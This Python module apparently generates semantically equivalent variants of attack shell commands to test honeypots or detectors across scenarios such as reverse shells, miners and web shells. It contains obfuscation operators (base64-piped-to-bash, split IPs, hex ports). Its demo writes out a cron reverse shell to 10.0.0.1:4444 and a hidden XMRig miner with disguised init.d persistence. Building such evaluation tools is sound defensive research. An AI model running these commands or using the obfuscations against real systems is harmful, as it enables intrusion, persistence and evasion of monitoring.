import random
import re
import base64
from typing import List, Dict, Callable, Optional, Tuple
from dataclasses import dataclass, field


# ===================== Mutation Operator Definitions =====================

@dataclass
class MutationRecord:
    """Records what mutation was applied."""
    operator: str       # e.g. "SyntaxEquiv"
    original: str       # original command
    mutated: str        # mutated command
    description: str    # human-readable description


class MutationOperator:
    """Base class for mutation operators."""
    name: str = "base"

    def applicable(self, cmd: str) -> bool:
        """Check if this operator can mutate the given command."""
        raise NotImplementedError

    def mutate(self, cmd: str, rng: random.Random) -> Tuple[str, str]:
        """Return (mutated_cmd, description). Must not change semantics."""
        raise NotImplementedError


# ================= 1. Syntax Equivalence =================

class EchoToPrintf(MutationOperator):
    """echo "text" >> file  →  printf "text\\n" >> file"""
    name = "SyntaxEquiv:echo→printf"

    # Match: echo "..." >> file  or  echo '...' >> file
    _pat = re.compile(
        r'^echo\s+([\"\'])(.*?)\1\s*>>\s*(.+)$'
    )

    def applicable(self, cmd: str) -> bool:
        return bool(self._pat.match(cmd.strip()))

    def mutate(self, cmd: str, rng: random.Random) -> Tuple[str, str]:
        m = self._pat.match(cmd.strip())
        q, text, target = m.group(1), m.group(2), m.group(3)
        return f'printf "{text}\\n" >> {target}', "echo→printf append"


class EchoToTee(MutationOperator):
    """echo "text" >> file  →  echo "text" | tee -a file > /dev/null"""
    name = "SyntaxEquiv:echo→tee"

    _pat = re.compile(
        r'^echo\s+([\"\'])(.*?)\1\s*>>\s*(.+)$'
    )

    def applicable(self, cmd: str) -> bool:
        return bool(self._pat.match(cmd.strip()))

    def mutate(self, cmd: str, rng: random.Random) -> Tuple[str, str]:
        m = self._pat.match(cmd.strip())
        q, text, target = m.group(1), m.group(2), m.group(3)
        return f'echo "{text}" | tee -a {target} > /dev/null', "echo→tee -a"


class CatToHead(MutationOperator):
    """cat file  →  head -9999 file"""
    name = "SyntaxEquiv:cat→head"

    _pat = re.compile(r'^cat\s+(\S+)\s*$')

    def applicable(self, cmd: str) -> bool:
        return bool(self._pat.match(cmd.strip()))

    def mutate(self, cmd: str, rng: random.Random) -> Tuple[str, str]:
        m = self._pat.match(cmd.strip())
        return f'head -9999 {m.group(1)}', "cat→head -9999"


class ChmodNumericToSymbolic(MutationOperator):
    """chmod +x file  →  chmod 755 file  (and vice versa)"""
    name = "SyntaxEquiv:chmod_form"

    _pat_symbolic = re.compile(r'^chmod\s+\+x\s+(.+)$')
    _pat_numeric = re.compile(r'^chmod\s+7[57][57]\s+(.+)$')

    def applicable(self, cmd: str) -> bool:
        c = cmd.strip()
        return bool(self._pat_symbolic.match(c) or self._pat_numeric.match(c))

    def mutate(self, cmd: str, rng: random.Random) -> Tuple[str, str]:
        c = cmd.strip()
        m = self._pat_symbolic.match(c)
        if m:
            return f'chmod 755 {m.group(1)}', "chmod +x → chmod 755"
        m = self._pat_numeric.match(c)
        return f'chmod +x {m.group(1)}', "chmod 755 → chmod +x"


class LsToFind(MutationOperator):
    """ls -la dir  →  find dir -maxdepth 1 -ls"""
    name = "SyntaxEquiv:ls→find"

    _pat = re.compile(r'^ls\s+-la\s+(\S+)\s*$')

    def applicable(self, cmd: str) -> bool:
        return bool(self._pat.match(cmd.strip()))

    def mutate(self, cmd: str, rng: random.Random) -> Tuple[str, str]:
        m = self._pat.match(cmd.strip())
        return f'find {m.group(1)} -maxdepth 1 -ls', "ls -la → find -ls"


# ================= 2. Path Equivalence =================

class TmpPathSwap(MutationOperator):
    """Swap /tmp/ ↔ /var/tmp/ ↔ /dev/shm/ for non-critical temp files."""
    name = "PathEquiv:tmp_swap"

    _paths = ['/tmp/', '/var/tmp/', '/dev/shm/']

    def applicable(self, cmd: str) -> bool:
        return any(p in cmd for p in self._paths)

    def mutate(self, cmd: str, rng: random.Random) -> Tuple[str, str]:
        for p in self._paths:
            if p in cmd:
                alternatives = [x for x in self._paths if x != p]
                new_p = rng.choice(alternatives)
                return cmd.replace(p, new_p), f"path {p} → {new_p}"
        return cmd, "no change"


class HomeTildeSwap(MutationOperator):
    """/root/ ↔ ~/ for root user context."""
    name = "PathEquiv:home_tilde"

    def applicable(self, cmd: str) -> bool:
        return '/root/' in cmd or '~/' in cmd

    def mutate(self, cmd: str, rng: random.Random) -> Tuple[str, str]:
        if '/root/' in cmd:
            return cmd.replace('/root/', '~/', 1), "/root/ → ~/"
        return cmd.replace('~/', '/root/', 1), "~/ → /root/"


# ================= 3. Encoding Obfuscation =================

class Base64Wrap(MutationOperator):
    """Wrap a simple command in base64 encoding: cmd → echo <b64> | base64 -d | bash"""
    name = "EncodingObfu:base64"

    # Only apply to simple single-line commands (not pipes, redirects, heredocs)
    _simple_cmd = re.compile(r'^(uname|id|hostname|whoami|w|df|uptime)\b')

    def applicable(self, cmd: str) -> bool:
        return bool(self._simple_cmd.match(cmd.strip()))

    def mutate(self, cmd: str, rng: random.Random) -> Tuple[str, str]:
        encoded = base64.b64encode(cmd.strip().encode()).decode()
        return f'echo {encoded} | base64 -d | bash', f"base64 wrap: {cmd.strip()[:30]}"


class VariableSplitIP(MutationOperator):
    """Split hardcoded IPs into shell variables: 10.0.0.1 → H="10.0"; T="0.1"; ... $H$T"""
    name = "EncodingObfu:var_split_ip"

    _ip_pat = re.compile(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})')

    def applicable(self, cmd: str) -> bool:
        return bool(self._ip_pat.search(cmd))

    def mutate(self, cmd: str, rng: random.Random) -> Tuple[str, str]:
        m = self._ip_pat.search(cmd)
        ip = m.group(1)
        parts = ip.split('.')
        # Split into two halves
        h1 = f"{parts[0]}.{parts[1]}"
        h2 = f"{parts[2]}.{parts[3]}"
        var_a = f"_h{rng.randint(1,99)}"
        var_b = f"_t{rng.randint(1,99)}"
        prefix = f'{var_a}="{h1}"; {var_b}="{h2}"; '
        new_cmd = cmd.replace(ip, f'${var_a}.${var_b}', 1)
        return prefix + new_cmd, f"IP variable split: {ip}"


class HexPort(MutationOperator):
    """Replace numeric port with $((0xNNNN)) expression."""
    name = "EncodingObfu:hex_port"

    _port_pat = re.compile(r'/(\d{4,5})\b')

    def applicable(self, cmd: str) -> bool:
        m = self._port_pat.search(cmd)
        return m is not None and m.group(1).isdigit()

    def mutate(self, cmd: str, rng: random.Random) -> Tuple[str, str]:
        m = self._port_pat.search(cmd)
        port = int(m.group(1))
        hex_port = f"$((0x{port:X}))"
        return cmd.replace(f'/{m.group(1)}', f'/{hex_port}', 1), f"port {port} → hex"


# ================= 4. Structural Rewrite =================

class EchoChainToHeredoc(MutationOperator):
    """
    Convert a sequence of echo-append commands targeting the same file
    into a single heredoc block.
    Operates on command LISTS, not single commands.
    """
    name = "StructRewrite:echo_chain→heredoc"

    _echo_append = re.compile(r'^echo\s+["\'](.+?)["\']\s*>>\s*(\S+)$')
    _echo_create = re.compile(r'^echo\s+["\'](.+?)["\']\s*>\s*(\S+)$')

    def applicable_list(self, cmds: List[str]) -> bool:
        """Check if a list of commands contains ≥2 echo appends to the same file."""
        targets = []
        for c in cmds:
            m = self._echo_append.match(c.strip()) or self._echo_create.match(c.strip())
            if m:
                targets.append(m.group(2))
        if not targets:
            return False
        from collections import Counter
        return Counter(targets).most_common(1)[0][1] >= 2

    def mutate_list(self, cmds: List[str], rng: random.Random) -> Tuple[List[str], str]:
        """Replace echo-append chains with heredoc. Returns (new_cmds_list, description)."""
        from collections import defaultdict

        # Group consecutive echo commands by target file
        target_lines = defaultdict(list)
        target_order = []
        non_echo = []
        first_target = None

        for i, c in enumerate(cmds):
            m_append = self._echo_append.match(c.strip())
            m_create = self._echo_create.match(c.strip())
            m = m_append or m_create
            if m:
                target = m.group(2)
                content = m.group(1)
                if target not in target_lines:
                    target_order.append((i, target))
                target_lines[target].append(content)
                if first_target is None:
                    first_target = target
            else:
                non_echo.append((i, c))

        if not first_target or len(target_lines[first_target]) < 2:
            return cmds, "no change"

        # Build heredoc for the most common target
        target = first_target
        lines = target_lines[target]
        heredoc_body = '\n'.join(lines)
        heredoc = f"cat > {target} << 'MUTATION_EOF'\n{heredoc_body}\nMUTATION_EOF"

        # Reconstruct command list: replace the echo chain with heredoc
        new_cmds = []
        target_replaced = False
        for i, c in enumerate(cmds):
            m = self._echo_append.match(c.strip()) or self._echo_create.match(c.strip())
            if m and m.group(2) == target:
                if not target_replaced:
                    new_cmds.append(heredoc)
                    target_replaced = True
                # Skip subsequent echo commands to this target
            else:
                new_cmds.append(c)

        return new_cmds, f"echo chain → heredoc for {target}"


class AndChainToMultiLine(MutationOperator):
    """Split cmd1 && cmd2 && cmd3 into separate commands."""
    name = "StructRewrite:&&_split"

    def applicable(self, cmd: str) -> bool:
        # Must have && but not inside quotes
        return ' && ' in cmd and not cmd.strip().startswith('cat ')

    def mutate(self, cmd: str, rng: random.Random) -> Tuple[str, str]:
        # Simple split on && (not inside quotes)
        parts = re.split(r'\s*&&\s*', cmd)
        if len(parts) > 1:
            return parts, f"split && chain into {len(parts)} commands"
        return cmd, "no change"


# ================= 5. Tool Substitution =================

class WgetToCurl(MutationOperator):
    """wget URL -O file  →  curl -sL URL -o file"""
    name = "ToolSubst:wget→curl"

    _pat = re.compile(r'^wget\s+(\S+)\s+-O\s+(\S+)$')

    def applicable(self, cmd: str) -> bool:
        return bool(self._pat.match(cmd.strip()))

    def mutate(self, cmd: str, rng: random.Random) -> Tuple[str, str]:
        m = self._pat.match(cmd.strip())
        return f'curl -sL {m.group(1)} -o {m.group(2)}', "wget → curl"


class CurlToWget(MutationOperator):
    """curl -s URL | bash  →  wget -qO- URL | bash"""
    name = "ToolSubst:curl→wget"

    _pat = re.compile(r'curl\s+-s\s+(\S+)\s*\|\s*bash')

    def applicable(self, cmd: str) -> bool:
        return bool(self._pat.search(cmd))

    def mutate(self, cmd: str, rng: random.Random) -> Tuple[str, str]:
        new = self._pat.sub(r'wget -qO- \1 | bash', cmd)
        return new, "curl -s | bash → wget -qO- | bash"


class UseraddToAdduser(MutationOperator):
    """useradd -m -s /bin/bash USER  →  adduser --shell /bin/bash --gecos '' USER"""
    name = "ToolSubst:useradd→adduser"

    _pat = re.compile(r'^useradd\s+-m\s+-s\s+/bin/bash\s+(?:-G\s+\S+\s+)?(\S+)$')

    def applicable(self, cmd: str) -> bool:
        return bool(self._pat.match(cmd.strip()))

    def mutate(self, cmd: str, rng: random.Random) -> Tuple[str, str]:
        m = self._pat.match(cmd.strip())
        username = m.group(1)
        # Check if there's a -G group
        group_match = re.search(r'-G\s+(\S+)', cmd)
        group_part = f" --ingroup {group_match.group(1)}" if group_match else ""
        return (
            f"adduser --shell /bin/bash --gecos ''{group_part} --disabled-password {username}",
            "useradd → adduser"
        )


class CrontabAppendToDirect(MutationOperator):
    """(crontab -l; echo "...") | crontab -  →  echo "..." >> /var/spool/cron/crontabs/root"""
    name = "ToolSubst:crontab_pipe→direct"

    _pat = re.compile(
        r'^\(crontab -l.*?;\s*echo\s+"(.+?)"\)\s*\|\s*crontab\s+-$'
    )

    def applicable(self, cmd: str) -> bool:
        return bool(self._pat.match(cmd.strip()))

    def mutate(self, cmd: str, rng: random.Random) -> Tuple[str, str]:
        m = self._pat.match(cmd.strip())
        entry = m.group(1)
        return (
            f'echo "{entry}" >> /var/spool/cron/crontabs/root',
            "crontab pipe → direct write"
        )


# ===================== Mutation Engine =====================

# All single-command operators
ALL_SINGLE_OPERATORS: List[MutationOperator] = [
    EchoToPrintf(),
    EchoToTee(),
    CatToHead(),
    ChmodNumericToSymbolic(),
    LsToFind(),
    TmpPathSwap(),
    HomeTildeSwap(),
    Base64Wrap(),
    VariableSplitIP(),
    HexPort(),
    AndChainToMultiLine(),
    WgetToCurl(),
    CurlToWget(),
    UseraddToAdduser(),
    CrontabAppendToDirect(),
]

# List-level operators
LIST_OPERATORS = [
    EchoChainToHeredoc(),
]


# Mutation classes for scenarios — controls which operators are eligible
MUTATION_PROFILES: Dict[str, List[str]] = {
    # Simple: only syntax + path swaps
    "simple": [
        "SyntaxEquiv", "PathEquiv",
    ],
    # Standard: syntax + path + tool substitution
    "standard": [
        "SyntaxEquiv", "PathEquiv", "ToolSubst",
    ],
    # Advanced: all operators
    "advanced": [
        "SyntaxEquiv", "PathEquiv", "EncodingObfu", "StructRewrite", "ToolSubst",
    ],
    # Obfuscated: encoding-heavy
    "obfuscated": [
        "EncodingObfu", "StructRewrite",
    ],
}

# Map scenario IDs to mutation profiles
SCENARIO_MUTATION_CLASS: Dict[str, str] = {
    # ATK-01..10
    "ATK-01": "simple",       # Recon — light mutations
    "ATK-02": "standard",     # Malware download
    "ATK-03": "standard",     # SSH key
    "ATK-04": "advanced",     # User creation
    "ATK-05": "advanced",     # Cron reverse shell
    "ATK-06": "standard",     # Crypto miner
    "ATK-07": "advanced",     # Systemd
    "ATK-08": "simple",       # Defense evasion
    "ATK-09": "advanced",     # Multi-stage
    "ATK-10": "advanced",     # Bashrc
    # ATK-11..30
    "ATK-11": "standard",     # Mirai
    "ATK-12": "standard",     # Gafgyt
    "ATK-13": "standard",     # IRC bot
    "ATK-14": "standard",     # SSH worm
    "ATK-15": "standard",     # DDoS
    "ATK-16": "simple",       # LD_PRELOAD
    "ATK-17": "simple",       # PAM
    "ATK-18": "advanced",     # RC local
    "ATK-19": "standard",     # PHP web shell
    "ATK-20": "simple",       # SUID
    "ATK-21": "simple",       # Net discovery
    "ATK-22": "simple",       # Cred harvest
    "ATK-23": "simple",       # Container escape
    "ATK-24": "simple",       # SSH key theft
    "ATK-25": "simple",       # Env exfil
    "ATK-26": "standard",     # Data exfil
    "ATK-27": "advanced",     # DNS tunnel
    "ATK-28": "obfuscated",   # Multi-lang shell (already obfuscated)
    "ATK-29": "standard",     # Process hiding
    "ATK-30": "advanced",     # Full APT chain
    # HoneyComb canonical
    "HC-T1053-003": "advanced",
    "HC-T1543-002": "advanced",
    "HC-T1098-004": "standard",
    "HC-T1136-001": "advanced",
    "HC-T1546-004": "advanced",
    "HC-T1037-004": "advanced",
    "HC-T1505-003": "standard",
    "HC-T1574-006": "simple",
    "HC-T1556-003": "simple",
    "HC-T1078-003": "standard",
}


def get_applicable_operators(
    cmd: str, mutation_class: str = "standard"
) -> List[MutationOperator]:
    """Return operators applicable to a command given the mutation profile."""
    allowed_prefixes = MUTATION_PROFILES.get(mutation_class, MUTATION_PROFILES["standard"])
    ops = []
    for op in ALL_SINGLE_OPERATORS:
        if not any(op.name.startswith(p) for p in allowed_prefixes):
            continue
        if op.applicable(cmd):
            ops.append(op)
    return ops


def mutate_command(
    cmd: str,
    mutation_class: str = "standard",
    rng: Optional[random.Random] = None,
) -> Tuple[str, Optional[MutationRecord]]:
    """
    Apply a single random mutation to a command.
    Returns (mutated_cmd_or_original, MutationRecord_or_None).
    """
    if rng is None:
        rng = random.Random()

    ops = get_applicable_operators(cmd, mutation_class)
    if not ops:
        return cmd, None

    op = rng.choice(ops)
    result, desc = op.mutate(cmd, rng)

    # Handle operators that return a list (e.g. && split)
    if isinstance(result, list):
        record = MutationRecord(
            operator=op.name, original=cmd, mutated=" ; ".join(result), description=desc
        )
        return result, record

    record = MutationRecord(operator=op.name, original=cmd, mutated=result, description=desc)
    return result, record


def mutate_command_list(
    cmds: List[str],
    scenario_id: str,
    rng: Optional[random.Random] = None,
    max_mutations_per_cmd: int = 1,
    mutation_probability: float = 0.6,
) -> Tuple[List[str], List[MutationRecord]]:
    """
    Apply mutations to a list of commands for a given scenario.

    Args:
        cmds: Original Session_A command list
        scenario_id: e.g. "ATK-05" — used to look up mutation class
        rng: Random instance for reproducibility
        max_mutations_per_cmd: Max mutations per single command
        mutation_probability: Probability of mutating each command

    Returns:
        (mutated_cmds, list_of_MutationRecords)
    """
    if rng is None:
        rng = random.Random()

    mutation_class = SCENARIO_MUTATION_CLASS.get(scenario_id, "standard")
    allowed_prefixes = MUTATION_PROFILES.get(mutation_class, MUTATION_PROFILES["standard"])
    records = []

    # First, try list-level operators
    mutated_cmds = list(cmds)
    if "StructRewrite" in allowed_prefixes:
        for list_op in LIST_OPERATORS:
            if hasattr(list_op, 'applicable_list') and list_op.applicable_list(mutated_cmds):
                if rng.random() < mutation_probability:
                    mutated_cmds, desc = list_op.mutate_list(mutated_cmds, rng)
                    records.append(MutationRecord(
                        operator=list_op.name,
                        original=str(cmds),
                        mutated=str(mutated_cmds),
                        description=desc,
                    ))
                break  # Only one list-level mutation per run

    # Then, apply single-command mutations
    final_cmds = []
    for cmd in mutated_cmds:
        if rng.random() < mutation_probability:
            result, record = mutate_command(cmd, mutation_class, rng)
            if record:
                records.append(record)
            if isinstance(result, list):
                final_cmds.extend(result)
            else:
                final_cmds.append(result)
        else:
            final_cmds.append(cmd)

    return final_cmds, records


def generate_k_variants(
    cmds: List[str],
    scenario_id: str,
    k: int = 3,
    base_seed: int = 42,
) -> List[Tuple[List[str], List[MutationRecord]]]:
    """
    Generate K distinct mutated variants of a command list.

    Returns list of (mutated_cmds, records) tuples.
    """
    variants = []
    for i in range(k):
        rng = random.Random(base_seed + i * 1000 + hash(scenario_id) % 10000)
        mutated, records = mutate_command_list(cmds, scenario_id, rng)
        variants.append((mutated, records))
    return variants


# ===================== CLI for testing =====================

if __name__ == "__main__":
    # Demo: mutate ATK-05 (Cron Reverse Shell)
    demo_cmds = [
        '(crontab -l 2>/dev/null; echo "*/10 * * * * /bin/bash -c \'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\'") | crontab -',
        "crontab -l",
    ]
    print("=== ATK-05 Command Mutation Demo ===\n")
    print("Original commands:")
    for c in demo_cmds:
        print(f"  {c}")

    variants = generate_k_variants(demo_cmds, "ATK-05", k=3)
    for i, (mutated, records) in enumerate(variants):
        print(f"\n--- Variant {i+1} ---")
        for c in mutated:
            print(f"  {c}")
        print(f"  Mutations applied: {len(records)}")
        for r in records:
            print(f"    [{r.operator}] {r.description}")

    # Demo: mutate ATK-06 (Crypto Miner — echo chain)
    demo_cmds2 = [
        "mkdir -p /opt/.hidden",
        'echo "#!/bin/bash" > /opt/.hidden/xmrig.sh',
        'echo "./xmrig -o stratum+tcp://pool.minexmr.com:4444 -u 4ATTACKER_WALLET -p x" >> /opt/.hidden/xmrig.sh',
        "chmod +x /opt/.hidden/xmrig.sh",
        'echo "#!/bin/bash" > /etc/init.d/system-update',
        'echo "/opt/.hidden/xmrig.sh &" >> /etc/init.d/system-update',
        "chmod +x /etc/init.d/system-update",
    ]
    print("\n\n=== ATK-06 Command Mutation Demo ===\n")
    print("Original commands:")
    for c in demo_cmds2:
        print(f"  {c}")

    variants2 = generate_k_variants(demo_cmds2, "ATK-06", k=3)
    for i, (mutated, records) in enumerate(variants2):
        print(f"\n--- Variant {i+1} ---")
        for c in mutated:
            print(f"  {c}")
        print(f"  Mutations applied: {len(records)}")
        for r in records:
            print(f"    [{r.operator}] {r.description}")
